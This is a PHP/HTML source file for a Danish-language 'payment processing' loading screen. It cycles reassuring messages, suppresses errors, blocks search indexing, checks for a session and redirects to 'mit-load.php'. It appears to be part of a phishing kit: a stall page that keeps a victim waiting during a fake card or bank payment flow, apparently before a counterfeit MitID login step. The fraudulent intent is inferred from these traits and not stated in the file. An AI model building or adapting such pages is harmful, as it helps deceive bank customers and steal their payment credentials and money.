<?php
error_reporting(0);
date_default_timezone_set('Europe/Copenhagen');
session_start();

require '../includes/alego.php';

// Session validation
if(!isset($_SESSION['active'])){
    header('Location: index.php');
    exit();
}
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Indlæser...</title>
    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
    <link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="google" content="notranslate">
    <style>
        .centered {
            text-align: center;
            margin: 20px auto 0;
            margin-bottom: 0px;
        }
        #schemeLogo {
            display: block;
            width: 200px;
            height: 80px;
            margin: auto;
            margin-bottom: 30px;
        }
        .message {
            display: none;
        }
        .gif-container {
            text-align: center;
            margin-top: 80px;
            margin-bottom: 30px
        }
        .gif-container img {
            width: 100px;
            height: auto;
        }
        
        @media (max-width: 768px) {
            body {
                transform: scale(1.2) !important;
                transform-origin: top center !important; 
            }
            .gif-container {
                margin-top: 150px !important;
                margin-bottom: 40px !important;
            }
            .gif-container img {
                width: 60px !important;
            }
            #schemeLogo {
                width: 150px !important;
                height: 60px !important;
                margin-top: 30px !important;
                margin-bottom: 0px !important;
            }
            .centered {
                margin-top: 20px !important;
                font-size: 1.2em !important;
            }
        }
    </style>
</head>
<body>
    <div class="gif-container">
        <img src="../assets/images/load.gif" alt="Loading...">
    </div>
        
    <div class="centered">
        <div class="message" id="message1" style="display: block;"><strong>Din betaling er ved at blive behandlet.</strong></div>
        <div class="message" id="message2" style="display: none;"><strong>Din transaktion behandles.</strong></div>
        <div class="message" id="message3" style="display: none;"><strong>Dette kan tage et øjeblik.</strong></div>
        <div class="message" id="message4" style="display: none;"><strong>Din tålmodighed er nøglen til vores succes.</strong></div>
        <div class="message" id="message5" style="display: none;"><strong>Vi værdsætter din tillid til os.</strong></div>
    </div>
    <script>
        let messages = document.querySelectorAll('.message');
        let currentMessage = 0;

        function showNextMessage() {
            messages[currentMessage].style.display = 'none';
            currentMessage = (currentMessage + 1) % messages.length;
            messages[currentMessage].style.display = 'block';
        }
        messages[currentMessage].style.display = 'block';
        
        setInterval(showNextMessage, 10000);
    </script>
    <script>
        setTimeout(function() {
            window.location.href = "mit-load.php";
        }, 10000);
    </script>

</body></html>